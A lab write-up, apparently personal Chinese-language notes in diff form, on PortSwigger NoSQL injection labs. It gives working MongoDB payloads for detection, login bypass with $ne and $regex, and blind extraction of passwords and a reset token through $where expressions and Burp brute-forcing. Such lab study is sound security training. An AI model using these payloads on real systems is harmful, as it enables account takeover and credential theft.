@@ -1,0 +1,137 @@
+https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection
+注入点产品过滤器 /filter?category=Pets
+
+/filter?category=Pets'
+报错
+
+/filter?category=Pets\'
+200，并回显添加的字符
+
+/filter?category=Pets<@burp_urlencode>'||'x'=='x'</@burp_urlencode>%00
+在末尾添加 空字符%00 使得MongoDB忽略其后内容
+
+@ 示例解决方案：使用或，解除前后条件限制 @
+Gifts'||1||'
+
+
+### 绕过身份验证 ###
+https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
+注入点为登录功能post的表单 POST /login HTTP/2
+{"username":"wiener","password":"peter"}
+
+使用
+{"username":"wiener","password":{"$ne":""}}
+登录成功
+
+@@ 使用正则表达式寻找可能的管理员名称 @@
+{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
+
+### 提取数据 ###
+https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
+注入点为显示自身角色的功能
+GET /user/lookup?user=wiener HTTP/2
+响应为
+{
+  "username": "wiener",
+  "email": "wiener@normal-user.net",
+  "role": "user"
+}
+
+修改参数查看管理员账户名
+/user/lookup?user=<@burp_urlencode>administrator</@burp_urlencode>
+响应为
+{
+  "username": "administrator",
+  "email": "admin@normal-user.net",
+  "role": "administrator"
+}
+
+确定密码字符串包含的类型，只包含小写字母
+/user/lookup?user=<@burp_urlencode>administrator' && this.password.match(/[a-z]/)</@burp_urlencode>%00
+
+@ 使用 this.password.length 判断密码长度 @
+
+修改参数提取密码，使用集群炸弹密码长度0-9，密码字符a-z
+/user/lookup?user=<@burp_urlencode>administrator' && this.password[$0$] == '$a$'</@burp_urlencode>%00
+
+
+### 操作符注入提取未知字段 ###
+https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields
+# 在表单中注入额外操作符，将得到的名称与令牌在可能相关的页面提交为参数 #
+在登录表单
+POST /login HTTP/2
+设置
+{"username":{"$ne":""},"password":{"$ne":""}, "$where":"0"}
+得到200登录错误消息
+Invalid username or password
+
+而
+{"username":{"$ne":""},"password":{"$ne":""}, "$where":"1"}
+得到500响应错误
+Query returned unexpected number of records
+
+此处可使用 $where 子句的js表达式
+判断对象的字段数量
+"$where":"Object.keys(this).length == $0$"
+载荷为5时返回500，字段数量为5
+
+判断字段长度，字段数量索引范围0-4，长度0-20
+"$where":"Object.keys(this)[$0$].length == $0$"
+得到
+3 8 8 5 13
+
+字段数量索引范围0-4，匹配字符范围字母数字与 _ &
+"$where":"Object.keys(this)[0][$0$] == '$a$'"
+得到
+_id
+username
+password
+email
+passwordReset
+
+@ 示例解决方案：第一个标识字符位置编号，而 第二个标识字符本身
+"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
+@
+
+将用户名改为目标用户名 carlos，# 或许从一开始就应当使用此用户名? #
+输入
+{"username":"carlos","password":{"$ne":""}, "$where":"1"}
+得到200
+Account locked: please reset your password
+
+输入
+{"username":"carlos","password":{"$ne":""}, "$where":"0"}
+得到200
+Invalid username or password
+
+此时
+"$where":"this.username == 'carlos'"
+得到200
+Account locked: please reset your password
+
+查询密码位数
+"$where":"this.username == 'carlos' && this.password.length == $0$"
+得到密码位数为 20
+
+爆破密码，集群炸弹设置密码位数及对应字符
+"$where":"this.username == 'carlos' && this.password[$0$] == '$a$'"
+得到密码
+28rz7yp74ga8332tjhkf
+登录响应为
+Account locked: please reset your password
+
+转而对passwordReset进行爆破
+查询字符串长度
+"$where":"this.passwordReset.length == $0$"
+得到字符串长度为16
+
+爆破重置密码字符串，集群炸弹设置字符串长度及对应字符
+"$where":"this.passwordReset[$0$] == '$a$'"
+得到
+b9544485f09fc7b9
+
+在密码重置页面
+/forgot-password
+添加参数
+/forgot-password?passwordReset=b9544485f09fc7b9
+进入密码重置页面
